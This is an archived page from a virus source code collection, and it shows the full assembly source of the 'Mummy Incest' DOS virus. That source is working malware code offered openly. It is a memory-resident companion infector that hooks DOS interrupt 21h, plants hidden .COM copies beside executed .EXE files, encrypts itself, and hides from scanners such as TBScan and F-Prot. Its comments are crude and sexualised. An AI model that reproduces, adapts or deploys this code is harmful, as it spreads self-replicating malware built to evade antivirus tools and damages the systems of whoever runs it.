<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: incmummy_asm</title>
<meta name="KEYWORDS" content="incmummy.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for incmummy.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ice_asm.php">ice_asm</a><br>
<a href="iceburn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iceburn_asm.php">iceburn_asm</a><br>
<a href="icecream_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icecream_asm.php">icecream_asm</a><br>
<a href="icelandi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icelandi_asm.php">icelandi_asm</a><br>
<a href="icel_mix_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icel_mix_asm.php">icel_mix_asm</a><br>
<a href="icemelt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemelt_asm.php">icemelt_asm</a><br>
<a href="icemix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemix1_asm.php">icemix1_asm</a><br>
<a href="igor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/igor_asm.php">igor_asm</a><br>
<a href="ikv_528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv_528_asm.php">ikv_528_asm</a><br>
<a href="ikv528x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv528x_asm.php">ikv528x_asm</a><br>
<a href="imm-265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-265_asm.php">imm-265_asm</a><br>
<a href="imm-353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-353_asm.php">imm-353_asm</a><br>
<a href="imm-377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-377_asm.php">imm-377_asm</a><br>
<a href="imm-510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-510_asm.php">imm-510_asm</a><br>
<a href="imm-550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-550_asm.php">imm-550_asm</a><br>
<a href="immor265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor265_asm.php">immor265_asm</a><br>
<a href="immor353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor353_asm.php">immor353_asm</a><br>
<a href="immor377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor377_asm.php">immor377_asm</a><br>
<a href="immor510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor510_asm.php">immor510_asm</a><br>
<a href="immor550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor550_asm.php">immor550_asm</a><br>
<a href="incdaddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incdaddy_asm.php">incdaddy_asm</a><br>
<a href="incmummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incmummy_asm.php">incmummy_asm</a><br>
<a href="incsistr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incsistr_asm.php">incsistr_asm</a><br>
<a href="incubus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus1_asm.php">incubus1_asm</a><br>
<a href="incubus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus_asm.php">incubus_asm</a><br>
<a href="indit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/indit_asm.php">indit_asm</a><br>
<a href="infecta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infecta_asm.php">infecta_asm</a><br>
<a href="infect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infect_asm.php">infect_asm</a><br>
<a href="infectb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infectb_asm.php">infectb_asm</a><br>
<a href="inferdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inferdem_asm.php">inferdem_asm</a><br>
<a href="insert_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insert_asm.php">insert_asm</a><br>
<a href="ins_real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins_real_asm.php">ins_real_asm</a><br>
<a href="ins-real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins-real_asm.php">ins-real_asm</a><br>
<a href="insuff_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insuff_asm.php">insuff_asm</a><br>
<a href="int_13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int_13_asm.php">int_13_asm</a><br>
<a href="int-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int-13_asm.php">int-13_asm</a><br>
<a href="int13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13__asm.php">int13__asm</a><br>
<a href="int13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13_asm.php">int13_asm</a><br>
<a href="intr1440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1440_asm.php">intr1440_asm</a><br>
<a href="intr1988_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1988_asm.php">intr1988_asm</a><br>
<a href="intrude__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intrude__asm.php">intrude__asm</a><br>
<a href="intruder_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intruder_asm.php">intruder_asm</a><br>
<a href="inv_danu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_danu_asm.php">inv_danu_asm</a><br>
<a href="invdanub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invdanub_asm.php">invdanub_asm</a><br>
<a href="inv_evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_evil_asm.php">inv_evil_asm</a><br>
<a href="inv-evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv-evil_asm.php">inv-evil_asm</a><br>
<a href="invol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invol_asm.php">invol_asm</a><br>
<a href="iod_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iod_asm.php">iod_asm</a><br>
<a href="ir144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ir144_asm.php">ir144_asm</a><br>
<a href="irm_kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/irm_kill_asm.php">irm_kill_asm</a><br>
<a href="israel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/israel_asm.php">israel_asm</a><br>
<a href="it_457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_457_asm.php">it_457_asm</a><br>
<a href="it-457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it-457_asm.php">it-457_asm</a><br>
<a href="ital_boy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ital_boy_asm.php">ital_boy_asm</a><br>
<a href="italian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italian_asm.php">italian_asm</a><br>
<a href="italiano_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italiano_asm.php">italiano_asm</a><br>
<a href="it_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_asm.php">it_asm</a><br>
<a href="it_pest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_pest_asm.php">it_pest_asm</a><br>
<a href="itti_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_a_asm.php">itti_a_asm</a><br>
<a href="itti-a___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a___asm.php">itti-a___asm</a><br>
<a href="itti-a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a__asm.php">itti-a__asm</a><br>
<a href="itti-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a_asm.php">itti-a_asm</a><br>
<a href="itti_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_b_asm.php">itti_b_asm</a><br>
<a href="itti-b___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b___asm.php">itti-b___asm</a><br>
<a href="itti-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b__asm.php">itti-b__asm</a><br>
<a href="itti-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b_asm.php">itti-b_asm</a><br>
<a href="itty_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_a_asm.php">itty_a_asm</a><br>
<a href="itty-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-a_asm.php">itty-a_asm</a><br>
<a href="itty_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_b_asm.php">itty_b_asm</a><br>
<a href="itty-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-b_asm.php">itty-b_asm</a><br>
<a href="itwisted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwisted_asm.php">itwisted_asm</a><br>
<a href="itwistu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwistu_asm.php">itwistu_asm</a><br>
<a href="ivpbecky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbecky_asm.php">ivpbecky_asm</a><br>
<a href="ivpbubb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubb2_asm.php">ivpbubb2_asm</a><br>
<a href="ivpbubbl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubbl_asm.php">ivpbubbl_asm</a><br>
<a href="ivp-dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dan_asm.php">ivp-dan_asm</a><br>
<a href="ivp-darl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-darl_asm.php">ivp-darl_asm</a><br>
<a href="ivp-dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dj_asm.php">ivp-dj_asm</a><br>
<a href="ivpmorbd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpmorbd_asm.php">ivpmorbd_asm</a><br>
<a href="ivpputer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpputer_asm.php">ivpputer_asm</a><br>
<a href="ivp-rose_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-rose_asm.php">ivp-rose_asm</a><br>
<a href="ivpshock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpshock_asm.php">ivpshock_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                                                                               
                                                                              
                                                                              
; This is the last virus in the Incest Family.  Say hello to 'Mummy'!         
; She's called Mummy because she spawns...                                    
                                                                              
; Mummy is a virus written completely on my own without seeing another        
; spawning virus.  It contains a number of unique features (I think!)         
                                                                              
; When the virus is in memory, TBScan can't find any of the spawnings!        
; It doesn't even open them up to look inside!  In fact I think that while    
; the virus is resident that NO scanner will be able to find it... even when  
; the signature finally comes out!                                            
                                                                              
; All heuristics pass straight over the top... so booting clean won't affect  
; anything unless the person running the scanner is really on the mark and    
; watching for double names.                                                  
                                                                              
; Anyway this is a new form of stealth (only useful for spawning virii        
; though...)  Have a look!  It's very simple!                                 
                                                                              
; Mummy is a TSR, spawning EXE infector.  It creates hidden COM files with    
; the same name as a corresponding EXE file.  It traps the loading of         
; executables and infects them (infection is loosely termed here).            
                                                                              
; The virus is completely harmless and is AT MOST a nuisance.  To disinfect   
; just delete the files.                                                      
                                                                              
; Complied using the a86 assembler.                                           
                                                                              
; Note for Americans : 'Mum' = 'Mom' in most english speaking countries.      
                                                                              
                                                                              
                                                                              
start:                                                                        
       mov     word ptr quit,20cdh                                            
quit:                                 ;Kill TBScan, FProt, TBClean and Debug  
       mov     word ptr quit,06c7h     ;Restore the bytes.                    
                                                                              
       mov     si,offset enc_start                                            
       call    encrypt                                                        
                                                                              
enc_start:                                                                    
                                                                              
       mov     word ptr cs:psp,es              ;Setup comline.                
                                                                              
       mov     ah,4ah                          ;Resize memory block so we     
       mov     bx,50                           ;have enough memory to execute 
       int     21h                             ;the infected program.         
                                                                              
       mov     ax,word ptr ds:[2ch]            ;Environment segment.          
                                                                              
       mov     ds,ax                           ;DS = environment.             
                                                                              
       xor     si,si                                                          
scan:                                                                         
       inc     si                                                             
       cmp     byte ptr ds:si,0                ;Search for a zero.            
                                                                              
       jne     scan                                                           
                                                                              
       cmp     byte ptr ds:[si+1],0            ;Double zero - end of envir.   
       jne     scan                                                           
                                                                              
       add     si,4                            ;Index to filename.            
       mov     dx,si                                                          
scan2:                                                                        
       inc     si                                                             
       cmp     byte ptr ds:si,'.'              ;Look for end of .EXT          
                                                                              
       jne     scan2                                                          
                                                                              
       mov     word ptr ds:[si+1],'XE'         ;Change to .EXE                
       mov     byte ptr ds:[si+3],'E'                                         
                                                                              
       push    dx                              ;Save filename offset          
                                                                              
       ;Test for residency...                                                 
       mov     ah,61h                          ;Mummy!!!                      
       mov     di,'MU'                                                        
       mov     bx,'M'                                                         
       int     21h                                                            
                                                                              
       cmp     cx,'MU'                         ;Is Mummy home ?               
       jne     execute                                                        
       cmp     dx,'M'                                                         
       jne     execute                                                        
                                                                              
       mov     cs:byte ptr resident,1                                         
                                                                              
execute:                                                                      
       pop     dx                                                             
                                                                              
       mov     ax,4b00h                        ;Execute the .EXE file!        
       mov     bx,offset parameter             ;Parameter table.              
       int     21h                                                            
                                                                              
       push    cs                                                             
       pop     ds                                                             
                                                                              
       cmp     byte ptr resident,1                                            
       je      normal_jend                                                    
                                                                              
       mov     byte ptr resident,0                                            
                                                                              
       mov     ax,3521h                        ;Get int 21h                   
       int     21h                                                            
                                                                              
       mov     word ptr i21,bx                 ;Set int 21h to our virus.     
       mov     word ptr i21_2,bx                                              
       mov     word ptr i21+2,es                                              
       mov     word ptr i21_2+2,es                                            
                                                                              
       mov     ah,61h                          ;Lets have incest...           
       mov     di,'IN'                                                        
       int     21h                                                            
                                                                              
       cmp     di,'NI'                         ;Is another family member      
                                               ;home ?                        
       jne     not_incest                                                     
                                               ;Yeh!  Lets fuck!              
                                                                              
       mov     word ptr i21_2,cx               ;The original interrupt        
       mov     word ptr i21_2+2,dx             ;passes from the other virus   
                                               ;to Mummy.                     
                                               ;Dont it feel good!            
not_incest:                                                                   
       mov     ax,2521h                        ;Point to our handler.         
       mov     dx,offset int_handler                                          
       int     21h                                                            
                                                                              
       mov     ax,3100h                        ;Mummy hops in bed.            
       mov     dx,80                          ;Shes got lots of work to do!   
       int     21h                                                            
                                                                              
normal_jend:                                                                  
                                                                              
       mov     ax,4c00h                        ;Quit.                         
       int     21h                                                            
                                                                              
;data                                                                         
       parameter       dw      0                                              
       com_line        dw      80h                                            
       psp     dw      0                                                      
       db      0bh dup (0)     ;Exec parameter table.                         
                                                                              
       Resident        db      0                                              
                                                                              
       db      '[Mummy Incest] by VLAD of Brisbane.',0                        
       db      'Breed baby breed!'                                            
                                                                              
int_handler     proc    near                                                  
                                                                              
       cmp     ah,4bh                          ;Execute instruction.          
       jne     test_other                                                     
                                                                              
       cmp     byte ptr cs:flag,1              ;Was a residency test          
       jne     infect                          ;just used ?                   
                                                                              
       mov     byte ptr cs:flag,0                                             
                                                                              
       jmp     far_ret                                                        
                                                                              
test_other:                                                                   
       ;Residency check                                                       
       ;If residentcy test then pass back values and set flag=1               
                                                                              
       ;insert residency test here...                                         
                                                                              
       cmp     ah,61h                                                         
       jne     hide_files                                                     
                                                                              
       cmp     di,'MU'                 ;Testing for residency ?               
       jne     chk4incest                                                     
       cmp     bx,'M'                                                         
       jne     chk4incest                                                     
                                                                              
       mov     cx,'MU'                                                        
       mov     dx,'M'                  ;Return test parameters.               
       mov     byte ptr cs:flag,1                                             
       iret                                                                   
                                                                              
chk4incest:                                                                   
       ;incest passing                                                        
       cmp     di,'IN'                         ;More family fun!              
       jne     far_ret                                                        
                                                                              
       mov     di,'NI'                         ;Put the interrupt out!        
       mov     cx,word ptr cs:[i21_2]                                         
       mov     dx,word ptr cs:[i21_2 + 2]      ;Mummy is dominant!            
       iret                                                                   
                                                                              
hide_files:                                                                   
       cmp     ah,4eh                          ;Findfirst                     
       jne     outa_here                                                      
                                                                              
       and     cx,0fffdh                       ;Remove 'hidden' attribute.    
                                                                              
outa_here:                                                                    
       jmp     far_ret                         ;Back to original interrupt.   
                                                                              
infect:                                                                       
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                              ;Save everything.              
       push    es                                                             
       push    ds                                                             
       push    si                                                             
       push    di                                                             
                                                                              
       mov     si,dx                           ;Filename into SI              
test_dot:                                                                     
       inc     si                                                             
       cmp     byte ptr ds:[si],'.'            ;The '.' in '.EXE'             
       jne     test_dot                                                       
       inc     si                                                             
       cmp     word ptr ds:[si],'XE'           ;EXE ?                         
       jne     far_pop                                                        
       cmp     byte ptr ds:[si+2],'E'                                         
       jne     far_pop                         ;Nope.                         
       mov     word ptr ds:[si],'OC'           ;Change it to its '.COM'       
       mov     byte ptr ds:[si+2],'M'          ; counterpart.                 
                                                                              
       mov     ah,3ch                          ;Create file.                  
       mov     cx,2                            ;Make it hidden.               
       call    int21h                                                         
                                                                              
       mov     bx,ax                           ;File handle into BX           
                                                                              
       push    cs                                                             
       pop     ds                              ;ES & DS = CS                  
       push    cs                                                             
       pop     es                                                             
                                                                              
       inc     byte ptr encryptor              ;Fix encryptor.                
       jnz     copy_virus                                                     
       inc     byte ptr encryptor                                             
                                                                              
copy_virus:                                                                   
                                                                              
       mov     cx,length                       ;Virus length into CX          
       mov     si,100h                         ;Start of virus.               
       mov     di,offset finish                ;Place to move virus to.       
       rep     movsb                           ;Move it!                      
                                                                              
       mov     si,offset finish + 18           ;Start encrypting here.        
       call    encrypt                         ;Encrypt the sucker.           
                                                                              
       mov     ah,40h                          ;Mummy is having a baby!       
       mov     cx,length                                                      
       mov     dx,offset finish                                               
       call    int21h                                                         
                                                                              
       mov     ah,3eh                          ;Close file.                   
       call    int21h                                                         
                                                                              
far_pop:                                                                      
                                                                              
       pop     di                                                             
       pop     si                                                             
       pop     ds                                                             
       pop     es                                                             
       pop     dx                              ;Restore everything.           
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
far_ret:                                                                      
                                                                              
       db      0eah                            ;Jumpf                         
       i21     dd      0                                                      
                                                                              
int21h  proc    near                                                          
       pushf                                                                  
       ;opcode for callf                                                      
       db 9ah                                  ;Callf                         
       i21_2   dd  0                                                          
                                                                              
       ret                                                                    
int21h  endp                                                                  
                                                                              
enc_end:                                        ;Stop encrypting here.        
                                                                              
       flag    db      0                                                      
                                                                              
int_handler     endp                                                          
                                                                              
encrypt proc    near                            ;Encrypt it.                  
                                                                              
;SI=start bit                                                                 
                                                                              
       mov     al,byte ptr cs:encryptor                                       
                                                                              
       push    cx                                                             
                                                                              
       mov     cx,offset enc_end - offset enc_start                           
                                                                              
enc_loop:                                                                     
       xor     byte ptr [si],al                                               
       neg     al                                                             
       rol     al,1                            ;Stuff around with AL.         
       inc     si                                                             
       loop    enc_loop                                                       
                                                                              
       pop     cx                                                             
                                                                              
       ret                                                                    
                                                                              
encrypt endp                                                                  
                                                                              
       encryptor       db      0                                              
                                                                              
finish:                                                                       
       length  equ offset finish - 100h                                       
                                                                              
                                                                              
</textarea></td></tr></table></body></html>
